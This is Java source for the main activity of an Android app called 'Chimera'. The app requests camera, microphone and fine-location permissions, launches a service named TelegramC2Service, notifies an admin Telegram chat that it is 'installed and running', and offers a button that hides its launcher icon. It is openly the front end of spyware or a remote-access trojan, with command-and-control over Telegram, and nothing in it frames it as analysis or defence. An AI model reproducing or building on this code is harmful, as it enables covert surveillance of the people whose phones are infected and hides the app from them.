package com.chimera;

import android.Manifest;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {
    private static final int REQ_CODE = 101;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button btnContinue = findViewById(R.id.btnContinue);
        Button btnHide = findViewById(R.id.btnHide);

        btnContinue.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestPerms();
            }
        });

        btnHide.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                try {
                    PackageManager pm = getPackageManager();
                    ComponentName cn = new ComponentName(MainActivity.this, MainActivity.class);
                    pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                    Toast.makeText(MainActivity.this, "Icon Hidden", Toast.LENGTH_SHORT).show();
                } catch (Exception e) {}
            }
        });
    }

    private void requestPerms() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                String[] perms = new String[]{
                        Manifest.permission.CAMERA,
                        Manifest.permission.RECORD_AUDIO,
                        Manifest.permission.ACCESS_FINE_LOCATION
                };
                boolean need = false;
                for (String p : perms) {
                    if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                        need = true;
                        break;
                    }
                }
                if (need) {
                    ActivityCompat.requestPermissions(this, perms, REQ_CODE);
                } else {
                    startTelegram();
                }
            } else {
                startTelegram();
            }
        } catch (Exception e) {}
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_CODE) {
            startTelegram();
        }
    }

    private void startTelegram() {
        try {
            startService(new Intent(this, TelegramC2Service.class));
            sendInstallMessage();
            finish();
        } catch (Exception e) {}
    }

    private void sendInstallMessage() {
        try {
            String token = ConfigLoader.getBotToken();
            long chat = ConfigLoader.getAdminId();
            if (token == null || chat == 0) return;
            String url = "https://api.telegram.org/bot" + token + "/sendMessage";
            String body = "{\"chat_id\":" + chat + ",\"text\":\"Chimera installed and running\"}";
            TelegramBotWorker worker = new TelegramBotWorker(this);
            worker.post(url, body);
        } catch (Exception e) {}
    }
}